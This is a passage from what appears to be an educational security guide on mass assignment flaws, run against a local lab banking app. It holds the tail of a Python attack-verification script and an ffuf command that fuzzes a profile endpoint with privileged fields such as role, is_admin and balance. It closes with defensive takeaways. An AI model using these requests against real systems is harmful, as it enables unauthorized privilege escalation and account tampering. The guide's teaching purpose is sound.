    user_data = scanner.verify_injection("/api/red/securebank/user")
    
    print("\n[*] Results:")
    print(json.dumps(results, indent=2))
    print("\n[*] User data after attack:")
    print(json.dumps(user_data, indent=2))
```

### Parameter Fuzzing with ffuf

```bash
# Install ffuf
go install github.com/ffuf/ffuf@latest

# Create wordlist of potential sensitive fields
cat > mass_assignment_fields.txt << EOF
role
admin
is_admin
superuser
balance
credit_limit
account_type
privilege
user_level
is_active
permissions
access_level
account_status
EOF

# Fuzz for mass assignment vulnerabilities
ffuf -w mass_assignment_fields.txt:FIELD \
     -w values.txt:VALUE \
     -X PUT \
     -H "Content-Type: application/json" \
     -H "Cookie: session=YOUR_SESSION" \
     -d '{"full_name":"Test","FIELD":"VALUE"}' \
     -u http://localhost:5000/api/red/securebank/profile \
     -mc 200 \
     -mr "success.*true"

# This will test all combinations of fields and values
# and show which ones are accepted by the server
```

---

## Summary

Mass Assignment vulnerabilities represent one of the most dangerous security flaws in modern web applications, particularly banking systems. The ability to modify sensitive fields like `role`, `balance`, and `is_active` can lead to complete system compromise and significant financial losses.

**Key Takeaways**:
1. **Never trust user input** - Always use whitelisting for allowed fields
2. **Implement defense in depth** - Combine whitelisting, validation, and CSRF protection
3. **Follow framework guidelines** - Use Strong Parameters (Rails), DTOs (C#), or explicit field whitelisting
4. **Test thoroughly** - Use automated tools and manual testing to verify protection
5. **Monitor for attacks** - Log suspicious field injection attempts

**Remember**: The cost of prevention is always less than the cost of a breach. Implement proper mass assignment protections today!

---

**Document Version**: 1.0  
**Last Updated**: 2024  
**Author**: AegisForge Security Team  
**Classification**: Educational Material  
